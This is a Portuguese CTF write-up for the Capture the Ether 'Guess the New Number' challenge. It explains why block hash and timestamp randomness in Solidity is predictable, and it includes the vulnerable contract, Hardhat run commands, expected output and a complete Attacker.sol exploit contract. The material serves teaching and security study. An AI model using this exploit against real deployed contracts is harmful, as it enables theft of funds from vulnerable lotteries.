# Guess the New Number - 400 pontos

## 📋 Resumo

Este desafio é uma variação do anterior. Desta vez, o número é gerado **on-demand** quando `guess()` é chamado, não no construtor. No entanto, a vulnerabilidade permanece: o número é calculado usando informações públicas do bloco (`block.blockhash(block.number - 1)` e `now`), que podem ser lidas e usadas para calcular o número antes de enviar a transação.

## 🔍 Análise do Contrato

```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

**Características:**
- O número é gerado **on-demand** dentro de `guess()`, não no construtor
- Usa `keccak256(block.blockhash(block.number - 1), now)` para gerar o número
- Construtor requer 1 ether para deploy
- Função `guess()` requer 1 ether por tentativa
- Se acertar, recebe 2 ether de volta
- Desafio completo quando o saldo do contrato é 0

**Vulnerabilidade:**
- O número é calculado usando `block.blockhash(block.number - 1)` e `now`
- Ambos são **públicos** e podem ser lidos
- O problema é que o número é calculado no momento da execução de `guess()`
- Se calcularmos e chamarmos em transações diferentes, o bloco pode mudar
- **Solução:** Usar um contrato atacante que calcula e chama na **mesma transação**, garantindo o mesmo bloco

## 🎯 Objetivo

Criar um contrato atacante que:
1. Calcula o número usando `keccak256(block.blockhash(block.number - 1), now)` na mesma transação
2. Chama `guess()` imediatamente com o número calculado
3. Garante que ambos usam o mesmo bloco (mesma transação)

## 🚀 Passo a Passo do Exploit

### 1. Fazer o deploy do contrato

```bash
npx hardhat run challenges/06_lottery_guess_new_number/scripts/deploy.js --network hardhat
```

Isso irá:
- Deployar o contrato enviando 1 ether (requerido pelo construtor)
- Mostrar o endereço do contrato e o saldo inicial (1 ether)
- Verificar que o desafio ainda não está completo

### 2. Executar o exploit

```bash
npx hardhat run challenges/06_lottery_guess_new_number/scripts/exploit.js --network hardhat
```

O exploit irá:
- Deployar o contrato atacante (`Attacker.sol`)
- O contrato atacante calcula o número na mesma transação
- Chama `guess()` imediatamente com o número calculado
- Recebe 2 ether de volta
- Verifica que o saldo do contrato é 0 e o desafio está completo

### 3. Verificar o resultado

O script mostrará:
- Estado antes: `saldo do contrato = 1 ETH`, `desafio completo = false`
- Contrato atacante deployado
- Transaction hash da chamada `attack()`
- Estado após: `saldo do contrato = 0 ETH`, `desafio completo = true`

## 📊 Resultado Esperado

```
🔍 Iniciando exploit do GuessTheNewNumberChallenge...

📦 Nenhum endereço fornecido. Fazendo deploy do contrato...

✅ Contrato deployado em: 0x5FbDB2315678afecb367f032d93F642f64180aa3

📍 Endereço do contrato: 0x5FbDB2315678afecb367f032d93F642f64180aa3
👤 Atacante: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

📊 Estado antes do exploit:
  - Saldo do contrato: 1.0 ETH
  - Desafio completo: false

🔍 Deployando contrato atacante...

✅ Contrato atacante deployado em: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
💡 O contrato atacante calcula e chama na mesma transação, garantindo o mesmo bloco

🎯 Executando exploit através do contrato atacante...

📤 Transaction enviada: 0x...
✅ Transaction confirmada!

📊 Estado após o exploit:
  - Saldo do contrato: 0.0 ETH
  - Desafio completo: true

🎉 Desafio completado! O número foi calculado e adivinhado corretamente
💰 Você recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro)
💡 O contrato atacante garantiu que o cálculo e a chamada usassem o mesmo bloco
```

## 🔗 Referências

- [Capture the Ether - Guess the new number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)
- [Hardhat Documentation](https://hardhat.org/docs)
- [Ethers.js Documentation](https://docs.ethers.org/)

## 💡 Aprendizados

- Como criar contratos atacantes para explorar vulnerabilidades
- Importância de executar cálculos e chamadas na mesma transação
- Como usar funções fallback para receber ether
- Por que informações de blocos não são seguras para aleatoriedade
- Diferença entre gerar números no construtor vs on-demand

## 🔒 Segurança

Este desafio demonstra que:
- **Gerar números on-demand não resolve o problema** se ainda usar dados públicos
- **Contratos atacantes podem calcular e chamar na mesma transação**, garantindo o mesmo bloco
- Informações de blocos (`block.blockhash`, `now`) são públicas e previsíveis
- Qualquer cálculo baseado em dados públicos pode ser replicado

**Por que usar um contrato atacante?**
- Se calcularmos o número em JavaScript e depois chamarmos `guess()`, podem ser transações diferentes
- O bloco pode mudar entre o cálculo e a execução
- Usando um contrato atacante, o cálculo e a chamada acontecem na **mesma transação**, garantindo o mesmo bloco

## 📝 Nota sobre Contratos Atacantes

O contrato atacante (`Attacker.sol`) é essencial para este exploit:

```solidity
contract Attacker {
    function attack(address challengeAddress) public payable {
        require(msg.value == 1 ether);
        
        // Calcular na mesma transação
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        // Chamar imediatamente na mesma transação
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(challengeAddress);
        challenge.guess.value(1 ether)(answer);
        
        // Transferir ether de volta
        msg.sender.transfer(address(this).balance);
    }
    
    function() public payable {} // Fallback para receber ether
}
```

**Pontos importantes:**
- Função fallback `function() public payable {}` é necessária para receber ether do challenge
- O cálculo e a chamada acontecem na mesma transação, garantindo o mesmo bloco
- O contrato transfere o ether de volta para o atacante original

## 🎓 Lição Aprendida

**Gerar números on-demand não resolve o problema de segurança se ainda usar dados públicos.** A única forma de criar aleatoriedade verdadeira em contratos é usar oráculos externos ou esquemas mais complexos. Contratos atacantes podem sempre calcular e chamar na mesma transação, garantindo que ambos usem os mesmos valores de bloco.

